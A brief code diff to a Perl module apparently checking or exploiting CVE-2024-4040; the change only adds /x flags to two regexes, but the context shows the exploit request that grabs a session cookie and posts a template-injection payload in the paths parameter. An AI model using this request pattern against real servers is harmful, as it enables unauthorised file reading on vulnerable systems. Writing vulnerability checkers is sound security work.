@@ -19,7 +19,7 @@ package Spellbook::Advisory::CVE_2024_4040 {
         );
     
         if ($target) {
-            if ($target !~ /^http(s)?:\/\//) {
+            if ($target !~ /^http(s)?:\/\//x) {
                 $target = "https://$target";
             }
             
@@ -36,7 +36,7 @@ package Spellbook::Advisory::CVE_2024_4040 {
 
             my $cookies = $response -> header("Set-Cookie");
 
-            if ($cookies =~ /currentAuth=([^;]+)/) {                
+            if ($cookies =~ /currentAuth=([^;]+)/x) {                
                 $response = $userAgent -> post($endpoint, 
                     Content_Type => "application/x-www-form-urlencoded", 
                     Content => "command=exists&paths=<INCLUDE>$payload</INCLUDE>&c2f=$1"
